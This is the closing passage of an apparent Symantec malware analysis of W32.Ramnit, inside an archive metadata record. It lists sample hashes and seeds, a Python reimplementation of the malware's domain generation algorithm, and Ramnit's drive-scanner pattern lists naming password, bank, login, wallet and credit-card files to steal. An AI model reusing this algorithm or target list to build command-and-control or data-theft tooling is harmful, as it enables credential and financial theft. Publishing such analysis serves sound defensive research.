0x6CB5A7D9 01/23/2014\n\nbfbf1ada395bd77005e5546d99970bd5 0x6CB5A7D9 01/26/2014\n\na7b357684a3c8ab8389b7bc93182c2be 0x6CB5A7D9 01/29/2014\n\n27758b919505e69311158bd5bccff5e1 0x6CB5A7D9 01/31/2014\n\n0187d53659703ebef9480113b164bce2 0x6CB5A7D9 02/06/2014\n\n6123ca0fd71708e17e34b79a13ba809d 0x6CB5A7D9 02/13/2014\n\n02c2bcb51940e516e042ca5f8cc298cf 0x6CB5A7D9 02/13/2014\n\n43562f96b322a6f8deb596dbd7fcccaa 0x6CB5A7D9 02/14/2014\n\nbc5e22f80718c5bbeb4e6854fa47e53d 0x6CB5A7D9 02/14/2014\n\nd232783ce30792412944f1c8c5e944fa 0x6CB5A7D9 02/25/2014\n\n2f2a7f60791dd08932892c81aca462c6 0x6CB5A7D9 03/12/2014\n\ne20ede29b4e9cfb520955c4d600484ce 0x6CB5A7D9 03/28/2014\n\nad46485cf22f97304f69d78a69d47cdf 0x6CB5A7D9 03/29/2014\n\n3d44ebc7f005d4eb1709400945da20da 0x79159C10 04/08/2014\n\n7aee496c13fa793a6b111ee20de727c4 0x79159C10 04/26/2014\n\n12d0efe0228f4ad95d91dc0c48313552 0x79159C10 07/12/2014\n\n14a6cfe2384495308f200ba09f5530e2 0x79159C10 08/22/2014\n\n0265903976bd21080da3b00c9d7ecdb3 0x79159C10 08/23/2014\n\necc4940acfd8b08e809215cfb523a0b1 0x79159C10 08/23/2014\n\n548c4eba63928ffab4ea6960c61c976e 0x79159C10 08/26/2014\n\n4538c3c3eaf10d14f7e826bf620faa82 0x79159C10 09/01/2014\n\n1ba3ebeb03494859f2da56c44b10eae8 0x79159C10 09/02/2014\n\n2bcb0d51cdd9afb3d098ece8137d60eb 0x79159C10 09/17/2014\n\n003d819078a9fee38dd0d0b77bdafb25 0x79159C10 09/20/2014\n\n30e5d2f3c99168aba0e0abd312ba6a27 0x79159C10 10/05/2014\n\n18086065d518213b31a454081d4f385b 0x79159C10 10/21/2014\n\n22849b1b4432fd60297746f9bb690239 0x79159C10 10/25/2014\n\n8f20ec6bdcc03f7d45a1baeeaf551115 0x79159C10 10/25/2014\n\n05e2b4e5b5084b2103e05fb39c1d0263 0x79159C10 10/26/2014\n\n07dd1865b30000b5e447676b34ac61dd 0x79159C10 10/27/2014\n\n5467ba99eeb7dc459417af1c3945ca34 0x79159C10 10/29/2014\n\n14196aeedc92c3ca8a3d813341b990f6 0x79159C10 10/30/2014\n\n2255dad450997321d63ad29e12a661b2 0x79159C10 10/30/2014\n\n0fb3d555f0ba510d6dcd4c1c1177e507 0x79159C10 11/02/2014\n\n114ed09112f43cf9df72f5dc586ce07b 0x79159C10 11/03/2014\n\n2caf2643241d4a38b35250e1117462c6 0x79159C10 11/04/2014\n\n155b5d45eb1f0fbdc95b1b3ac087b349 0x79159C10 11/05/2014\n\n0dbb8b7a073f1306b700b513af715d8a 0x79159C10 11/10/2014\n\n285cc5d36bb412c544d930032695a1a7 0x79159C10 11/10/2014\n\n\n-----\n\n##### DGA\n```\n           import os, sys\n           def pseudo _ random(seed, limit):\n             val _ rand = 0\n             new _ seed = 0\n             div _ 1  = seed / 0x1F31D\n             mod _ 1  = seed % 0x1F31D\n             mull _ 1  = (mod _ 1 * 0x41A7) & 0xFFFFFFFF \n             mull _ 2  = (div _ 1 * 0xB14) & 0xFFFFFFFF\n             new _ seed = (mull _ 1 - mull _ 2) & 0xFFFFFFFF\n             val _ rand = new _ seed % limit\n             return (val _ rand, new _ seed)\n           if len(os.sys.argv) != 3:\n             print “usage: dga.py hex _ seed int _ count”\n             exit(1)\n           seed = os.sys.argv[1]\n           seed = int(seed, 16) & 0xFFFFFFFF\n           for c in range(0, int(os.sys.argv[2], 10)):   \n             (len, seed _ save) = pseudo _ random(seed, 12)\n             new _ seed = seed _ save\n             len   = len + 8\n             url   = “”\n             for i in range(0, len):\n               (val, new _ seed) = pseudo _ random(new _ seed, 25)\n               val = (val & 0xFF) + 0x61\n               url += chr(val)\n             print “seed: %x, %s.com” % (seed, url)\n             m  = seed * seed _ save\n             seed = ((m >> 32) + m) & 0xFFFFFFFF\n\n Drive scanner configuration file\n           *wallet.dat\n           *pass*\n           *pass*.txt\n           *pass*.docx\n           *pass*.xlsx\n           *password*\n           *password*.txt\n           *password*.docx\n           *password*.xlsx\n           *passwords*.\n           *passwords*.txt\n           *passwords*.docx\n           *passwords*.xlsx\n           *serial*.\n\n```\n\n-----\n\n```\n           *serial*.docx\n           *serial*.xlsx\n           *bank*\n           *bank*.txt\n           *bank*.xlsx\n           *bank*.docx\n           *info*\n           *info*.txt\n           *info*.xlsx\n           *info*.docx\n           *login*\n           *login*.txt\n           *login*.xlsx\n           *login*.docx\n           *acc*\n           *acc*.txt\n           *acc*.xlsx\n           *acc*.docx\n           *account*\n           *account*.txt\n           *account*.xlsx\n           *account*.docx\n           *accounts*\n           *accounts*.txt\n           *accounts*.xlsx\n           *accounts*.docx\n           *l[REMOVED]*\n           *t[REMOVED]*\n           *h[REMOVED]*\n           *s[REMOVED]*\n           *h[REMOVED]*\n           *b[REMOVED]*\n           *c[REMOVED]*\n           *n[REMOVED]*\n           *C[REMOVED]*\n           *S[REMOVED]*\n           *R[REMOVED]*\n           *U[REMOVED]*\n           *cards*.\n           *card*.\n           *cards*.\n           *credit*.\n           *b[REMOVED]*.\n           *c[REMOVED]*.\n           *w[REMOVED]*.\n           !*m[REMOVED]*\n           !*.inf*\n           !*.sys*\n           !*.dat*\n           !*.dll*\n           !*.pdf*\n           !*.cat*\n           !*.enc*\n           !*.url*\n           !*windows*\n           !*system*\n           !*SYSTEM*\n           !*winxp*\n\n```\n!*program files*\n\n\n-----\n\n```\n           !*Program Files (x86)*\n           !*I[REMOVED]*\n           !*a[REMOVED]*\n           !*backup*\n           !*a[REMOVED]*\n           !*toolbar*\n           !*cache*\n           !*temporary*\n           !*y[REMOVED]*\n\n```\n!*\\cookies\\*\n!*\\tmp\\*\n!*\\temp\\*\n!*\\t[REMOVED]\\*\n!*\\system volume information\\*\n!*\\i386\\*\n!*\\h[REMOVED]\\*\n!*\\$Recycle.Bin\\*\n!*\\AppData\\*\n!*\\D[REMOVED]\\*\n!*\\U[REMOVED]\\*\n!*\\softwares\\*\n!*\\Local Settings\\*\n!*\\ProgramData\\*\n##### Recent drive scanner configuration file–November 2014\n```\n           *wallet.dat\n           *pass*.\n           *password*.\n           *passwords*.\n           *serial*.\n           *bank*.\n           *info*.\n           *login*.\n           *acc*.\n           *account*.\n           *accounts*.\n           *l[REMOVED]*.\n           *t[REMOVED]*.\n           *h[REMOVED]*.\n           *s[REMOVED]*.\n           *h[REMOVED]*.\n           *b[REMOVED]*.\n           *c[REMOVED]*.\n           *n[REMOVED]*.\n           *C[REMOVED]*.\n           *S[REMOVED]*.\n           *R[REMOVED]*.\n           *U[REMOVED]*.\n           *c[REMOVED]*.\n           *c[REMOVED]*.\n           *a[REMOVED]*.\n           *cards*.\n           *card*.\n           *cards*.\n           *credit*.\n           *b[REMOVED]*.\n           *c[REMOVED]*.\n\n```\n\n-----\n\n```\n           *w[REMOVED]*.\n           !*m[REMOVED]*\n           !*.inf*\n           !*.sys*\n           !*.dat*\n           !*.dll*\n           !*.pdf*\n           !*.cat*\n           !*.enc*\n           !*.url*\n           !*.DBF*\n           !*.FPT*\n           !*.BAK*\n           !*.CDX*\n           !*.FPT*\n           !*.sol*\n           !*.lnk*\n           !*.vbs*\n           !*.rpt*\n           !*.MDX*\n           !*.SAV*\n           !*.reg*\n           !*.OCX*\n           !*.lbl*\n           !*.lbp*\n           !*.lbv*\n           !*windows*\n           !*system*\n           !*SYSTEM*\n           !*winxp*\n\n```\n!*program files*\n```\n           !*Program Files (x86)*\n           !*I[REMOVED]*\n           !*a[REMOVED]*\n           !*backup*\n           !*a[REMOVED]*\n           !*toolbar*\n           !*cache*\n           !*temporary*\n           !*y[REMOVED]*\n\n```\n!*\\cookies\\*\n!*\\tmp\\*\n!*\\temp\\*\n!*\\t[REMOVED]\\*\n!*\\system volume information\\*\n!*\\i386\\*\n!*\\h[REMOVED]\\*\n!*\\$Recycle.Bin\\*\n!*\\AppData\\*\n!*\\D[REMOVED]\\*\n!*\\U[REMOVED]\\*\n!*\\softwares\\*\n!*\\Local Settings\\*\n!*\\ProgramData\\*\n\n!*RECYCLER*\n\n\n-----\n\n###### About Symantec\nSymantec Corporation (NASDAQ: SYMC) is an information\nprotection expert that helps people, businesses and\ngovernments seeking the freedom to unlock the opportunities\ntechnology brings -- anytime, anywhere. Founded in April\n1982, Symantec, a Fortune 500 company, operating one of\nthe largest global data-intelligence networks, has provided\nleading security, backup and availability solutions for where\nvital information is stored, accessed and shared. The company’s\nmore than 20,000 employees reside in more than 50 countries.\nNinety-nine percent of Fortune 500 companies are Symantec\ncustomers. In fiscal 2014, it recorded revenues of $6.7 billion.\n\n[To learn more go to www.symantec.com or connect with](http://www.symantec.com)\nSymantec at: go.symantec.com/social/.\n\nFor specific country offices and contact numbers, please visit our website.\n\nSymantec World Headquarters Copyright © 2015 Symantec Corporation. All\n350 Ellis St. rights reserved. Symantec, the Symantec Logo,\n\nand the Checkmark Logo are trademarks or\n\nMountain View, CA 94043 USA\n\nregistered trademarks of Symantec Corporation\n\n+1 (650) 527-8000 or its affiliates in the U.S. and other countries.\n1 (800) 721-3934 Other names may be trademarks of their\nwww.symantec.com respective owners.\n\nAny technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec\nCorporation.\n\nNO WARRANTY . The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use. Any use\nof the technical documentation or the information contained herein is at the risk of the user. Documentation may include technical or other inaccuracies or\ntypographical errors. Symantec reserves the right to make changes without prior notice.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://informationsecurity.report/Resources/Whitepapers/b201d876-c5df-486d-975e-2dc08eb85f02_W32.Ramnit%20analysis.pdf"
    ],
    "report_names": [
        "b201d876-c5df-486d-975e-2dc08eb85f02_W32.Ramnit%20analysis.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1698718113,
    "ts_updated_at": 1743041140,
    "ts_creation_date": 1424277137,
    "ts_modification_date": 1424277140,
    "files": {
        "pdf": "https://archive.orkl.eu/0fdc99132ee6665ebf396ec641e69c64115a6c43.pdf",
        "text": "https://archive.orkl.eu/0fdc99132ee6665ebf396ec641e69c64115a6c43.txt",
        "img": "https://archive.orkl.eu/0fdc99132ee6665ebf396ec641e69c64115a6c43.jpg"
    }
}